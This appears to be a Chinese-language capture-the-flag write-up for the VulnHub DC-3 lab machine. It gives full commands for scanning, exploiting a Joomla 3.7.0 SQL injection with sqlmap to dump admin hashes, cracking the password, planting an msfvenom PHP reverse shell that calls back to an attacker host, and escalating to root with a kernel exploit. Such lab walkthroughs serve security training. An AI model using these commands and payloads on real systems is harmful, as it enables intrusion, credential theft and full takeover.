vulnhub-DC-3

目标靶机IP地址为 192.168.93.9

使用Nmap进行全端口扫描

nmap -A -p- 192.168.93.9

目标开放80端口，在浏览器中访问

指纹识别

使用 Joomla 搭建的网站

查看历史遗留文件泄露版本信息

http://192.168.93.9/README.txt
http://192.168.93.9/language/en-GB/en-GB.xml

Joomla版本信息为 3.7

使用 JoomScan 进行扫描

git clone https://github.com/rezasp/joomscan
cd joomscan
perl joomscan.pl -u http://192.168.93.9

同样探测出版本信息为 3.7.0，还扫描出管理后台地址 http://192.168.93.9/administrator/

搜索该版本历史漏洞

searchsploit Joomla 3.7

从结果可以看到 Joomla 3.7.0 版本有 SQl 注入漏洞

查看漏洞描述信息

cat /usr/share/exploitdb/exploits/php/webapps/42033.txt

使用SQLMap进行注入

sqlmap -u "http://192.168.93.9/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

获取到数据库名

继续跑表

sqlmap -u "http://192.168.93.9/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --tables

跑字段

sqlmap -u "http://192.168.93.9/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' --columns

最后dump数据

sqlmap -u "http://192.168.93.9/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' -C id,name,username,password --dump

获取到管理员账号和密码Hash

用户名：admin
密码Hash：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu

将密码Hash保存到文件，然后使用 john 暴力破解

爆破成功，得到明文密码为snoopy

使用账号密码登录管理后台

后台可以创建和编辑PHP文件

使用MSF生成PHP反弹shell

msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.93.7 LPORT=4444 -f raw > shell.php

在 Extensions -> Templates -> Templates -> Beez3 Details and Files -> New File 处新建一个文件 shell.php

将MSF生成的代码复制到shell.php文件中保存

访问 192.168.93.9/templates/beez3/shell.php 成功反弹回一个meterpreter会话

执行shell命令切换到shell环境下，收集信息

目标主机内核版本4.4.0-21-generic，发行版本 Ubuntu 16.04，用searchsploit搜索可以利用的漏洞

有 ‘double-fdput()’ bpf(BPF PROG LOAD) 本地提权漏洞

查看漏洞利用信息

cat /usr/share/exploitdb/exploits/linux/local/39772.txt

得到提权利用脚本下载地址

https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip

将脚本下载下来然后上传到目标靶机中

将提权利用脚本上传到目标靶机 tmp 目录下，解压

unzip 39772.zip

在 39772 目录下会生成 exploit.tar 文件，使用 tar 命令解压

tar -xvf exploit.tar

编译脚本

cd ebpf_mapfd_doubleput_exploit
chmod +x compile.sh
./compile.sh

执行脚本提权

./doubleput

提权成功，查看flag
